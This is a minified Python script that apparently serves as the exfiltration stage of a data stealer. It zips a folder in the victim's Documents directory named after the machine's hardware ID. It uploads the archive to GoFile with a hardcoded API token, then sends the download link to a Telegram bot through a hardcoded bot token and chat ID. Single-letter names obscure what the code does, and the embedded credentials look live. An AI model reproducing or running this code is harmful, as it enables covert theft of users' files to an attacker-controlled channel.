_A='status'
import uuid,os,zipfile,requests,random
def get_hw_id():return uuid.getnode()
def create_folder_with_hw_id():B=str(get_hw_id());C=os.path.join(os.path.expanduser('~'),'Documents');A=os.path.join(C,B);os.makedirs(A,exist_ok=True);return A
def zip_folder(folder_path):
	A=folder_path;B=A+'.zip'
	with zipfile.ZipFile(B,'w',zipfile.ZIP_DEFLATED)as D:
		for(E,I,F)in os.walk(A):
			for G in F:C=os.path.join(E,G);H=os.path.relpath(C,A);D.write(C,H)
	return B
def fetch_gofile_server():
	C='https://api.gofile.io/servers';print(f"Fetching server from: {C}");A=requests.get(C);print(f"Response Status Code: {A.status_code}")
	if A.status_code==200:
		B=A.json();print(f"Server Data: {B}")
		if B[_A]=='ok':D=B['data']['servers'];E=random.choice(D);F=E['name'];return F
		else:raise Exception(f"GoFile server error: {B[_A]}")
	else:print(f"Error Response Content: {A.content}");raise Exception(f"Failed to get GoFile server. Status code: {A.status_code}")
def upload_to_gofile(zip_path):
	C='W90brtpQqqWrPsTiR8cyKA3ViwJ6vJFY';D='e35764c3-dc47-4d01-87df-ba49c1d85036';E=fetch_gofile_server();F=f"https://{E}.gofile.io/contents/uploadfile"
	with open(zip_path,'rb')as G:
		H={'file':G};I={'Authorization':f"Bearer {C}"};J={'folderId':D};A=requests.post(F,files=H,data=J,headers=I)
		if A.status_code==200:
			B=A.json();print(f"Upload Response: {B}")
			if B[_A]=='ok':K=B['data']['downloadPage'];return K
			else:raise Exception(f"GoFile error: {B[_A]}")
		else:print(f"Upload Error Response Content: {A.content}");raise Exception(f"Failed to upload to GoFile. Status code: {A.status_code}")
def send_telegram_message(file_link):
	B='5342706635';C='7356172746:AAHFG_ii0jxgwxYot-Lka6x8wmiCYKnByqI';D=f"https://api.telegram.org/bot{C}/sendMessage";E=f"{file_link}";A=requests.post(D,data={'chat_id':B,'text':E})
	if A.status_code==200:print('Message sent to Telegram successfully.')
	else:print(f"Failed to send message to Telegram. Status code: {A.status_code}");print(f"Error response content: {A.content}")
if __name__=='__main__':
	folder_path=create_folder_with_hw_id();zip_path=zip_folder(folder_path)
	try:file_link=upload_to_gofile(zip_path);print(f"{file_link}");send_telegram_message(file_link)
	except Exception as e:print(f"Error: {e}")